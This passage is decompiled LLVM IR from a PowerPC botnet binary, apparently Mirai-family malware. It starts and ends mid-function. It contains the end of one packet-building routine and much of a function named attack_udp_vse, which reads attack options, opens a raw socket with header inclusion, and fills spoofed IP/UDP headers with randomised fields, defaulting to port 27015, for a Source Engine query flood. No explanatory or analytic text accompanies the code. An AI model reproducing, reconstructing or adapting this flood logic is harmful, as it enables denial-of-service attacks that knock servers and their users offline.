  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10004c50 = load i32, i32* @r23, align 4
  %v2_10004c50 = load i32, i32* @r29, align 4
  %v4_10004c50 = add i32 %v2_10004c50, %v1_10004c50
  %v5_10004c50 = inttoptr i32 %v4_10004c50 to i8*
  store i8 0, i8* %v5_10004c50, align 1
  br label %dec_label_pc_10004b4c

dec_label_pc_10004c58:                            ; preds = %dec_label_pc_10004c70, %dec_label_pc_10004b30
  %v0_10004c58 = call i32 @rand_next()
  %v1_10004c58 = trunc i32 %v0_10004c58 to i16
  store i32 %v0_10004c58, i32* %r3.global-to-local, align 4
  %v3_10004c5c = load i32, i32* @r28, align 4
  %v4_10004c5c = add i32 %v3_10004c5c, 4
  %v5_10004c5c = inttoptr i32 %v4_10004c5c to i16*
  store i16 %v1_10004c58, i16* %v5_10004c5c, align 2
  %v0_10004c60 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10004c60, label %dec_label_pc_10004c64, label %dec_label_pc_10004b38

dec_label_pc_10004c64:                            ; preds = %dec_label_pc_10004c58, %dec_label_pc_10004b34
  %v0_10004c64 = call i32 @rand_next()
  %v1_10004c64 = trunc i32 %v0_10004c64 to i16
  store i32 %v0_10004c64, i32* %r3.global-to-local, align 4
  %v3_10004c68 = load i32, i32* @r28, align 4
  %v4_10004c68 = add i32 %v3_10004c68, 20
  %v5_10004c68 = inttoptr i32 %v4_10004c68 to i16*
  store i16 %v1_10004c64, i16* %v5_10004c68, align 2
  br label %dec_label_pc_10004b38

dec_label_pc_10004c70:                            ; preds = %dec_label_pc_10004b20
  %v0_10004c70 = call i32 @rand_next()
  store i32 %v0_10004c70, i32* %r3.global-to-local, align 4
  %v1_10004c74 = load i32, i32* @r28, align 4
  %v2_10004c74 = add i32 %v1_10004c74, 12
  %v3_10004c74 = inttoptr i32 %v2_10004c74 to i32*
  store i32 %v0_10004c70, i32* %v3_10004c74, align 4
  %v0_10004c78 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10004c78, label %dec_label_pc_10004c58, label %dec_label_pc_10004b34

dec_label_pc_10004c80:                            ; preds = %dec_label_pc_10004b00
  %v1_10004c80 = add i32 %v2_10004b0c, 16
  %v2_10004c80 = inttoptr i32 %v1_10004c80 to i32*
  %v3_10004c80 = load i32, i32* %v2_10004c80, align 4
  store i32 %v3_10004c80, i32* %r29.global-to-local, align 4
  %v0_10004c84 = call i32 @rand_next()
  store i32 %v0_10004c84, i32* %r3.global-to-local, align 4
  %v3_10004c88 = load i32, i32* %stack_var_-104, align 4
  %v1_10004c8c = mul i32 %v3_10004c88, 24
  %v1_10004c90 = load i32, i32* @r31, align 4
  %v2_10004c90 = add i32 %v1_10004c90, %v1_10004c8c
  store i32 %v2_10004c90, i32* %r9.global-to-local, align 4
  %v1_10004c94 = add i32 %v2_10004c90, 20
  %v2_10004c94 = inttoptr i32 %v1_10004c94 to i8*
  %v3_10004c94 = load i8, i8* %v2_10004c94, align 1
  %v4_10004c94 = zext i8 %v3_10004c94 to i32
  store i32 %v4_10004c94, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10004c94, 64
  %v2_10004c98 = zext i8 %tmp to i32
  %v3_10004c98 = lshr i32 %v0_10004c84, %v2_10004c98
  %v1_10004c9c = load i32, i32* %r29.global-to-local, align 4
  %v2_10004c9c = add i32 %v3_10004c98, %v1_10004c9c
  store i32 %v2_10004c9c, i32* %r3.global-to-local, align 4
  %v1_10004ca0 = load i32, i32* @r28, align 4
  %v2_10004ca0 = add i32 %v1_10004ca0, 16
  %v3_10004ca0 = inttoptr i32 %v2_10004ca0 to i32*
  store i32 %v2_10004c9c, i32* %v3_10004ca0, align 4
  br label %dec_label_pc_10004b20

dec_label_pc_10004ca8:                            ; preds = %dec_label_pc_100049e0
  store i32 1460, i32* @r23, align 4
  br label %dec_label_pc_100049f8

dec_label_pc_10004cb0:                            ; preds = %dec_label_pc_100049bc
  %v0_10004cb0 = load i32, i32* @r22, align 4
  store i32 %v0_10004cb0, i32* @r3, align 4
  %v0_10004cb4 = call i32 @__GI___libc_close()
  store i32 %v0_10004cb4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10004bd0

dec_label_pc_10004cc0:                            ; preds = %dec_label_pc_10004a10, %dec_label_pc_10004cc0
  store i32 1510, i32* %r3.global-to-local, align 4
  store i32 268455116, i32* @lr, align 4
  %v2_10004cc8 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_10004cc8, i32* %r3.global-to-local, align 4
  %v3_10004ccc = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10004ccc, i32* %r10.global-to-local, align 4
  %v0_10004cd0 = load i32, i32* @r29, align 4
  %v1_10004cd0 = mul i32 %v0_10004cd0, 4
  store i32 %v1_10004cd0, i32* %r0.global-to-local, align 4
  %v1_10004cd4 = load i32, i32* @r21, align 4
  %v3_10004cd4 = add i32 %v1_10004cd4, %v1_10004cd0
  %v4_10004cd4 = inttoptr i32 %v3_10004cd4 to i32*
  store i32 %v2_10004cc8, i32* %v4_10004cd4, align 4
  %v0_10004cd8 = load i32, i32* %r10.global-to-local, align 4
  %v1_10004cd8 = mul i32 %v0_10004cd8, 4
  store i32 %v1_10004cd8, i32* %r9.global-to-local, align 4
  %v1_10004cdc = add i32 %v0_10004cd8, 1
  store i32 %v1_10004cdc, i32* %r29.global-to-local, align 4
  %v1_10004ce0 = mul i32 %v0_10004cd8, 24
  store i32 %v1_10004ce0, i32* %r10.global-to-local, align 4
  %v1_10004ce4 = load i32, i32* @r21, align 4
  %v2_10004ce4 = add i32 %v1_10004ce4, %v1_10004cd8
  %v3_10004ce4 = inttoptr i32 %v2_10004ce4 to i32*
  %v4_10004ce4 = load i32, i32* %v3_10004ce4, align 4
  store i32 %v4_10004ce4, i32* %r11.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_10004cec = load i32, i32* %r20.global-to-local, align 4
  %v2_10004cec = icmp slt i32 %v1_10004cdc, %v1_10004cec
  %v3_10004cec = icmp sgt i32 %v1_10004cdc, %v1_10004cec
  %v4_10004cec = icmp eq i32 %v1_10004cdc, %v1_10004cec
  store i1 %v2_10004cec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10004cec, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10004cec, i1* %cr7_eq.global-to-local, align 1
  %v1_10004cf0 = load i32, i32* @r31, align 4
  %v2_10004cf0 = add i32 %v1_10004cf0, %v1_10004ce0
  store i32 %v2_10004cf0, i32* %r10.global-to-local, align 4
  %v1_10004cf4 = inttoptr i32 %v4_10004ce4 to i32*
  %v2_10004cf4 = load i32, i32* %v1_10004cf4, align 4
  store i32 %v2_10004cf4, i32* %r0.global-to-local, align 4
  %v1_10004cf8 = add i32 %v4_10004ce4, 20
  store i32 %v1_10004cf8, i32* %r8.global-to-local, align 4
  %v0_10004cfc = load i32, i32* %r19.global-to-local, align 4
  %v1_10004cfc = trunc i32 %v0_10004cfc to i8
  %v3_10004cfc = add i32 %v4_10004ce4, 8
  %v4_10004cfc = inttoptr i32 %v3_10004cfc to i8*
  store i8 %v1_10004cfc, i8* %v4_10004cfc, align 1
  %v1_10004d00 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10004d00, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_10004d08 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 17, i32* %r9.global-to-local, align 4
  %v1_10004d10 = load i32, i32* %r11.global-to-local, align 4
  %v2_10004d10 = inttoptr i32 %v1_10004d10 to i32*
  store i32 %v1_10004d08, i32* %v2_10004d10, align 4
  store i32 16384, i32* %r0.global-to-local, align 4
  %v0_10004d18 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004d18 = trunc i32 %v0_10004d18 to i8
  %v2_10004d18 = load i32, i32* %r11.global-to-local, align 4
  %v3_10004d18 = add i32 %v2_10004d18, 9
  %v4_10004d18 = inttoptr i32 %v3_10004d18 to i8*
  store i8 %v1_10004d18, i8* %v4_10004d18, align 1
  %v0_10004d1c = load i32, i32* %r18.global-to-local, align 4
  %v1_10004d1c = trunc i32 %v0_10004d1c to i8
  %v2_10004d1c = load i32, i32* %r11.global-to-local, align 4
  %v3_10004d1c = add i32 %v2_10004d1c, 1
  %v4_10004d1c = inttoptr i32 %v3_10004d1c to i8*
  store i8 %v1_10004d1c, i8* %v4_10004d1c, align 1
  %v0_10004d20 = load i32, i32* @r26, align 4
  %v1_10004d20 = load i32, i32* %r11.global-to-local, align 4
  %v2_10004d20 = add i32 %v1_10004d20, 12
  %v3_10004d20 = inttoptr i32 %v2_10004d20 to i32*
  store i32 %v0_10004d20, i32* %v3_10004d20, align 4
  %v0_10004d24 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004d24 = trunc i32 %v0_10004d24 to i16
  %v2_10004d24 = load i32, i32* %r11.global-to-local, align 4
  %v3_10004d24 = add i32 %v2_10004d24, 6
  %v4_10004d24 = inttoptr i32 %v3_10004d24 to i16*
  store i16 %v1_10004d24, i16* %v4_10004d24, align 2
  %v0_10004d28 = load i32, i32* %r10.global-to-local, align 4
  %v1_10004d28 = add i32 %v0_10004d28, 16
  %v2_10004d28 = inttoptr i32 %v1_10004d28 to i32*
  %v3_10004d28 = load i32, i32* %v2_10004d28, align 4
  store i32 %v3_10004d28, i32* %r9.global-to-local, align 4
  %v0_10004d2c = load i32, i32* @r24, align 4
  %v1_10004d2c = trunc i32 %v0_10004d2c to i16
  %v2_10004d2c = load i32, i32* %r11.global-to-local, align 4
  %v3_10004d2c = add i32 %v2_10004d2c, 2
  %v4_10004d2c = inttoptr i32 %v3_10004d2c to i16*
  store i16 %v1_10004d2c, i16* %v4_10004d2c, align 2
  %v0_10004d30 = load i32, i32* @r27, align 4
  %v1_10004d30 = trunc i32 %v0_10004d30 to i16
  %v2_10004d30 = load i32, i32* %r11.global-to-local, align 4
  %v3_10004d30 = add i32 %v2_10004d30, 4
  %v4_10004d30 = inttoptr i32 %v3_10004d30 to i16*
  store i16 %v1_10004d30, i16* %v4_10004d30, align 2
  %v0_10004d34 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004d34 = load i32, i32* %r11.global-to-local, align 4
  %v2_10004d34 = add i32 %v1_10004d34, 16
  %v3_10004d34 = inttoptr i32 %v2_10004d34 to i32*
  store i32 %v0_10004d34, i32* %v3_10004d34, align 4
  %v0_10004d38 = load i32, i32* @r28, align 4
  %v1_10004d38 = trunc i32 %v0_10004d38 to i16
  %v2_10004d38 = load i32, i32* %r11.global-to-local, align 4
  %v3_10004d38 = add i32 %v2_10004d38, 20
  %v4_10004d38 = inttoptr i32 %v3_10004d38 to i16*
  store i16 %v1_10004d38, i16* %v4_10004d38, align 2
  %v0_10004d3c = load i32, i32* @r25, align 4
  %v1_10004d3c = trunc i32 %v0_10004d3c to i16
  %v2_10004d3c = load i32, i32* %r8.global-to-local, align 4
  %v3_10004d3c = add i32 %v2_10004d3c, 4
  %v4_10004d3c = inttoptr i32 %v3_10004d3c to i16*
  store i16 %v1_10004d3c, i16* %v4_10004d3c, align 2
  %v0_10004d40 = load i32, i32* @r30, align 4
  %v1_10004d40 = trunc i32 %v0_10004d40 to i16
  %v2_10004d40 = load i32, i32* %r8.global-to-local, align 4
  %v3_10004d40 = add i32 %v2_10004d40, 2
  %v4_10004d40 = inttoptr i32 %v3_10004d40 to i16*
  store i16 %v1_10004d40, i16* %v4_10004d40, align 2
  %v0_10004d44 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10004d44, i32* %stack_var_-104, align 4
  %v0_10004d48 = load i1, i1* %cr7_lt.global-to-local, align 1
  br i1 %v0_10004d48, label %dec_label_pc_10004cc0, label %dec_label_pc_10004ab0

; uselistorder directives
  uselistorder i32 %v4_10004ce4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10004cdc, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10004cd8, { 1, 0 }
  uselistorder i32 %v0_10004cd8, { 1, 2, 0 }
  uselistorder i32 %v1_10004cd0, { 1, 0 }
  uselistorder i32 %v0_10004c64, { 1, 0 }
  uselistorder i32 %v0_10004c58, { 1, 0 }
  uselistorder i32 %v0_10004c30, { 1, 0 }
  uselistorder i32 %v0_10004bc4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10004bb0, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32 %v4_10004b78, { 1, 0 }
  uselistorder i32 %v0_10004b38, { 2, 1, 0 }
  uselistorder i32 %v0_10004b20, { 1, 0 }
  uselistorder i32 %v1_10004b04, { 1, 0 }
  uselistorder i32 %v0_10004ae4, { 2, 1, 0 }
  uselistorder i32 %v4_10004a50, { 1, 0, 2 }
  uselistorder i32 %v1_10004a48, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10004a44, { 1, 0 }
  uselistorder i32 %v0_10004a44, { 1, 2, 0 }
  uselistorder i32 %v1_10004a3c, { 1, 0 }
  uselistorder i32 %v1_100049e0, { 1, 2, 3, 0 }
  uselistorder i32 %v5_100049d4, { 2, 1, 0, 3 }
  uselistorder i32 %v3_100049ac, { 0, 3, 2, 1, 4 }
  uselistorder i32* %stack_var_-104, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 23, 14, 15, 16, 17, 18, 19, 1, 3, 20, 21, 2, 22, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 16, 17, 19 }
  uselistorder i32 1510, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder label %dec_label_pc_10004cc0, { 1, 0 }
  uselistorder label %dec_label_pc_10004c3c, { 1, 0 }
  uselistorder label %dec_label_pc_10004bd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004b4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004b38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004b20, { 1, 0 }
  uselistorder label %dec_label_pc_10004a2c, { 1, 0 }
  uselistorder label %dec_label_pc_100049f8, { 1, 0 }
}

define i32 @attack_udp_vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r7.global-to-local, align 4
  store i32 %arg4, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp = call i16 @__decompiler_undefined_function_1()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v0_10004d54 = load i32, i32* @lr, align 4
  store i32 %v0_10004d54, i32* %r0.global-to-local, align 4
  %v0_10004d58 = call i32 @__asm_mfcr()
  store i32 0, i32* @r21, align 4
  store i32 %arg2, i32* @r24, align 4
  %v0_10004d6c = load i32, i32* @r27, align 4
  store i32 %v0_10004d58, i32* @r27, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v0_10004d7c = load i32, i32* %r0.global-to-local, align 4
  %v0_10004da8 = load i32, i32* @r28, align 4
  store i32 %arg5, i32* @r28, align 4
  %v0_10004db0 = load i32, i32* @r29, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* @r30, align 4
  %v0_10004dc0 = load i32, i32* @r31, align 4
  store i32 0, i32* %stack_var_-88, align 4
  store i32 268455376, i32* @lr, align 4
  %v2_10004dcc = call i32 @calloc(i32 %arg2, i32 4)
  store i32 %v2_10004dcc, i32* @r25, align 4
  %v0_10004dd4 = load i32, i32* @r28, align 4
  store i32 2, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v0_10004de0 = load i32, i32* @r29, align 4
  store i32 %v0_10004de0, i32* %r3.global-to-local, align 4
  store i32 268455400, i32* @lr, align 4
  %v4_10004de4 = inttoptr i32 %v0_10004dd4 to i32*
  %v5_10004de4 = call i32 @attack_get_opt_int(i32 %v0_10004de0, i32* %v4_10004de4, i32 2, i32 0)
  store i32 65535, i32* %r6.global-to-local, align 4
  store i32 3, i32* %r5.global-to-local, align 4
  %v0_10004df4 = load i32, i32* @r28, align 4
  %v1_10004df8 = urem i32 %v5_10004de4, 256
  store i32 %v1_10004df8, i32* %r20.global-to-local, align 4
  %v0_10004dfc = load i32, i32* @r29, align 4
  store i32 %v0_10004dfc, i32* %r3.global-to-local, align 4
  store i32 268455428, i32* @lr, align 4
  %v4_10004e00 = inttoptr i32 %v0_10004df4 to i32*
  %v5_10004e00 = call i32 @attack_get_opt_int(i32 %v0_10004dfc, i32* %v4_10004e00, i32 3, i32 65535)
  %v0_10004e04 = load i32, i32* @r28, align 4
  store i32 4, i32* %r5.global-to-local, align 4
  store i32 64, i32* %r6.global-to-local, align 4
  store i32 %v5_10004e00, i32* %r15.global-to-local, align 4
  %v0_10004e14 = load i32, i32* @r29, align 4
  store i32 %v0_10004e14, i32* %r3.global-to-local, align 4
  store i32 268455452, i32* @lr, align 4
  %v4_10004e18 = inttoptr i32 %v0_10004e04 to i32*
  %v5_10004e18 = call i32 @attack_get_opt_int(i32 %v0_10004e14, i32* %v4_10004e18, i32 4, i32 64)
  %v0_10004e1c = load i32, i32* @r28, align 4
  store i32 5, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v1_10004e28 = urem i32 %v5_10004e18, 256
  store i32 %v1_10004e28, i32* @r22, align 4
  %v0_10004e2c = load i32, i32* @r29, align 4
  store i32 %v0_10004e2c, i32* %r3.global-to-local, align 4
  store i32 268455476, i32* @lr, align 4
  %v4_10004e30 = inttoptr i32 %v0_10004e1c to i32*
  %v5_10004e30 = call i32 @attack_get_opt_int(i32 %v0_10004e2c, i32* %v4_10004e30, i32 5, i32 0)
  store i32 65535, i32* %r6.global-to-local, align 4
  store i32 6, i32* %r5.global-to-local, align 4
  %v0_10004e40 = load i32, i32* @r28, align 4
  %v1_10004e44 = urem i32 %v5_10004e30, 256
  store i32 %v1_10004e44, i32* %r16.global-to-local, align 4
  %v0_10004e48 = load i32, i32* @r29, align 4
  store i32 %v0_10004e48, i32* %r3.global-to-local, align 4
  store i32 268455504, i32* @lr, align 4
  %v4_10004e4c = inttoptr i32 %v0_10004e40 to i32*
  %v5_10004e4c = call i32 @attack_get_opt_int(i32 %v0_10004e48, i32* %v4_10004e4c, i32 6, i32 65535)
  store i32 7, i32* %r5.global-to-local, align 4
  store i32 27015, i32* %r6.global-to-local, align 4
  %v0_10004e58 = load i32, i32* @r28, align 4
  store i32 %v5_10004e4c, i32* %r18.global-to-local, align 4
  %v0_10004e60 = load i32, i32* @r29, align 4
  store i32 %v0_10004e60, i32* %r3.global-to-local, align 4
  store i32 268455528, i32* @lr, align 4
  %v4_10004e64 = inttoptr i32 %v0_10004e58 to i32*
  %v5_10004e64 = call i32 @attack_get_opt_int(i32 %v0_10004e60, i32* %v4_10004e64, i32 7, i32 27015)
  %v0_10004e68 = load i32, i32* @r21, align 4
  store i32 %v0_10004e68, i32* %stack_var_-84, align 4
  store i32 %v5_10004e64, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10004e74 = call i32 @__GI_time()
  %v1_10004e78 = load i32, i32* @r27, align 4
  %v2_10004e78 = add i32 %v1_10004e78, %v0_10004e74
  store i32 %v2_10004e78, i32* %r17.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 268455556, i32* @lr, align 4
  %v1_10004e80 = call i32 @table_unlock_val(i32 36)
  store i32 36, i32* %r3.global-to-local, align 4
  %v3_10004e8c = call i32 @table_retrieve_val(i32 36, i32* nonnull %stack_var_-84)
  store i32 %v3_10004e8c, i32* @r23, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268455588, i32* @lr, align 4
  %v3_10004ea0 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_10004ea0, i32* %r3.global-to-local, align 4
  %v3_10004ea4 = icmp eq i32 %v3_10004ea0, -1
  store i1 %v3_10004ea4, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_10004ea0, i32* @r26, align 4
  br i1 %v3_10004ea4, label %dec_label_pc_100050a4, label %dec_label_pc_10004eb0

dec_label_pc_10004eb0:                            ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r5.global-to-local, align 4
  %v2_10004ebc = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_10004ebc, i32* %r6.global-to-local, align 4
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-88, align 4
  store i32 268455628, i32* @lr, align 4
  %v5_10004ec8 = call i32 @__GI_setsockopt(i32 0, i32 3, i32 %v2_10004ebc, i32 4, i32 4)
  store i32 %v5_10004ec8, i32* %r3.global-to-local, align 4
  %v3_10004ecc = icmp eq i32 %v5_10004ec8, -1
  store i1 %v3_10004ecc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004ecc, label %dec_label_pc_10005154, label %dec_label_pc_10004ed4

dec_label_pc_10004ed4:                            ; preds = %dec_label_pc_10004eb0
  %v0_10004ed4 = load i32, i32* @r24, align 4
  %v3_10004ed4 = icmp eq i32 %v0_10004ed4, 0
  store i1 %v3_10004ed4, i1* %cr7_eq.global-to-local, align 1
  %v0_10004ed8 = load i32, i32* @r21, align 4
  store i32 %v0_10004ed8, i32* %stack_var_-88, align 4
  %v0_10004edc = load i32, i32* %r15.global-to-local, align 4
  %v1_10004edc = urem i32 %v0_10004edc, 65536
  store i32 %v1_10004edc, i32* @r27, align 4
  %v0_10004ee0 = load i32, i32* %r18.global-to-local, align 4
  %v1_10004ee0 = urem i32 %v0_10004ee0, 65536
  store i32 %v1_10004ee0, i32* @r28, align 4
  %v0_10004ee4 = call i32 @__asm_mfcr()
  store i32 %v0_10004ee4, i32* %r3.global-to-local, align 4
  %v1_10004ee8 = mul i32 %v0_10004ee4, 268435456
  store i32 %v1_10004ee8, i32* %r19.global-to-local, align 4
  %v0_10004eec = load i32, i32* %r31.global-to-local, align 4
  %v1_10004eec = urem i32 %v0_10004eec, 65536
  store i32 %v1_10004eec, i32* %r29.global-to-local, align 4
  %v0_10004ef0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004ef0, label %dec_label_pc_10004fbc, label %dec_label_pc_10004ef4

dec_label_pc_10004ef4:                            ; preds = %dec_label_pc_10004ed4
  %v0_10004ef4 = load i32, i32* %r16.global-to-local, align 4
  %v3_10004ef4 = icmp eq i32 %v0_10004ef4, 0
  store i1 %v3_10004ef4, i1* %cr4_eq.global-to-local, align 1
  store i32 0, i32* %r31.global-to-local, align 4
  %v4_10004f50 = zext i16 %tmp to i32
  br label %dec_label_pc_10004f00

dec_label_pc_10004f00:                            ; preds = %dec_label_pc_10004f74, %dec_label_pc_10004ef4
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 268455692, i32* @lr, align 4
  %v2_10004f08 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_10004f08, i32* %r3.global-to-local, align 4
  %v3_10004f0c = load i32, i32* %stack_var_-88, align 4
  store i32 %v3_10004f0c, i32* %r9.global-to-local, align 4
  %v0_10004f10 = load i32, i32* @r31, align 4
  %v1_10004f10 = mul i32 %v0_10004f10, 4
  store i32 %v1_10004f10, i32* %r0.global-to-local, align 4
  %v0_10004f14 = load i32, i32* @r23, align 4
  %v1_10004f18 = load i32, i32* @r25, align 4
  %v3_10004f18 = add i32 %v1_10004f18, %v1_10004f10
  %v4_10004f18 = inttoptr i32 %v3_10004f18 to i32*
  store i32 %v2_10004f08, i32* %v4_10004f18, align 4
  %v0_10004f1c = load i32, i32* %r9.global-to-local, align 4
  %v1_10004f1c = mul i32 %v0_10004f1c, 24
  store i32 %v1_10004f1c, i32* %r11.global-to-local, align 4
  %v1_10004f20 = mul i32 %v0_10004f1c, 4
  store i32 %v1_10004f20, i32* %r9.global-to-local, align 4
  %v1_10004f24 = load i32, i32* @r25, align 4
  %v2_10004f24 = add i32 %v1_10004f24, %v1_10004f20
  %v3_10004f24 = inttoptr i32 %v2_10004f24 to i32*
  %v4_10004f24 = load i32, i32* %v3_10004f24, align 4
  store i32 %v4_10004f24, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_10004f2c = load i32, i32* @r30, align 4
  %v2_10004f2c = add i32 %v1_10004f2c, %v1_10004f1c
  store i32 %v2_10004f2c, i32* %r11.global-to-local, align 4
  %v1_10004f30 = inttoptr i32 %v4_10004f24 to i32*
  %v2_10004f30 = load i32, i32* %v1_10004f30, align 4
  store i32 %v2_10004f30, i32* %r0.global-to-local, align 4
  %v1_10004f34 = add i32 %v4_10004f24, 32
  store i32 %v1_10004f34, i32* %r3.global-to-local, align 4
  %v0_10004f38 = load i32, i32* @r27, align 4
  %v1_10004f38 = trunc i32 %v0_10004f38 to i16
  %v3_10004f38 = add i32 %v4_10004f24, 4
  %v4_10004f38 = inttoptr i32 %v3_10004f38 to i16*
  store i16 %v1_10004f38, i16* %v4_10004f38, align 2
  %v1_10004f3c = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10004f3c, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_10004f44 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10004f44, i32* %r0.global-to-local, align 4
  %v1_10004f48 = load i32, i32* %r10.global-to-local, align 4
  %v2_10004f48 = inttoptr i32 %v1_10004f48 to i32*
  store i32 %v1_10004f44, i32* %v2_10004f48, align 4
  %v0_10004f4c = load i32, i32* %r20.global-to-local, align 4
  %v1_10004f4c = trunc i32 %v0_10004f4c to i8
  %v2_10004f4c = load i32, i32* %r10.global-to-local, align 4
  %v3_10004f4c = add i32 %v2_10004f4c, 1
  %v4_10004f4c = inttoptr i32 %v3_10004f4c to i8*
  store i8 %v1_10004f4c, i8* %v4_10004f4c, align 1
  store i32 %v4_10004f50, i32* %r9.global-to-local, align 4
  %v0_10004f54 = load i32, i32* @r22, align 4
  %v1_10004f54 = trunc i32 %v0_10004f54 to i8
  %v2_10004f54 = load i32, i32* %r10.global-to-local, align 4
  %v3_10004f54 = add i32 %v2_10004f54, 8
  %v4_10004f54 = inttoptr i32 %v3_10004f54 to i8*
  store i8 %v1_10004f54, i8* %v4_10004f54, align 1
  %v0_10004f58 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004f58 = add i32 %v0_10004f58, 12
  store i32 %v1_10004f58, i32* %r8.global-to-local, align 4
  %v1_10004f5c = add i32 %v0_10004f58, 32
  %v1_10004f60 = trunc i32 %v1_10004f5c to i16
  %v2_10004f60 = load i32, i32* %r10.global-to-local, align 4
  %v3_10004f60 = add i32 %v2_10004f60, 2
  %v4_10004f60 = inttoptr i32 %v3_10004f60 to i16*
  store i16 %v1_10004f60, i16* %v4_10004f60, align 2
  %v0_10004f64 = load i32, i32* %r10.global-to-local, align 4
  %v1_10004f64 = add i32 %v0_10004f64, 20
  store i32 %v1_10004f64, i32* %r9.global-to-local, align 4
  %v0_10004f68 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10004f68, label %dec_label_pc_10004f74, label %dec_label_pc_10004f6c

dec_label_pc_10004f6c:                            ; preds = %dec_label_pc_10004f00
  store i32 16384, i32* %r0.global-to-local, align 4
  %v3_10004f70 = add i32 %v0_10004f64, 6
  %v4_10004f70 = inttoptr i32 %v3_10004f70 to i16*
  store i16 16384, i16* %v4_10004f70, align 2
  %v2_10004f78.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10004f74

dec_label_pc_10004f74:                            ; preds = %dec_label_pc_10004f00, %dec_label_pc_10004f6c
  %v2_10004f78 = phi i32 [ %v0_10004f64, %dec_label_pc_10004f00 ], [ %v2_10004f78.pre, %dec_label_pc_10004f6c ]
  store i32 17, i32* %r0.global-to-local, align 4
  %v0_10004f78 = load i32, i32* @r28, align 4
  %v1_10004f78 = trunc i32 %v0_10004f78 to i16
  %v3_10004f78 = add i32 %v2_10004f78, 20
  %v4_10004f78 = inttoptr i32 %v3_10004f78 to i16*
  store i16 %v1_10004f78, i16* %v4_10004f78, align 2
  %v0_10004f7c = load i32, i32* %r0.global-to-local, align 4
